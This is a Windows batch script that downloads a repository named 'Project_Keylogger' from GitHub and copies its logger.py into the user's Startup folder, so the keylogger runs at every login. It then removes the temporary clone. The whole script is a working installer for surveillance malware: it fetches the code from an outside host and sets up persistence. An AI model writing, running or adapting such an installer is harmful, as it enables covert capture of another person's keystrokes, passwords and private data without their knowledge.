@echo off

setlocal

REM Set the GitHub repository URL and Python file name
set GITHUB_REPO_URL=https://github.com/DarshanParappagoudar/Project_Keylogger.git
set PYTHON_FILE_NAME=logger.py

REM Set the path to the Startup folder
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Clone the GitHub repository to a temporary directory
set TEMP_DIR=%TEMP%\repo
git clone %GITHUB_REPO_URL% %TEMP_DIR%

REM Copy the Python file to the Startup folder
set PYTHON_FILE_PATH=%TEMP_DIR%\%PYTHON_FILE_NAME%
if exist "%PYTHON_FILE_PATH%" (
    copy "%PYTHON_FILE_PATH%" "%STARTUP_FOLDER%\%PYTHON_FILE_NAME%"
    echo Successfully added %PYTHON_FILE_NAME% to the Startup folder.
) else (
    echo Failed to find %PYTHON_FILE_NAME% in the repository.
)

REM Clean up the temporary directory
rd /s /q %TEMP_DIR%

pause
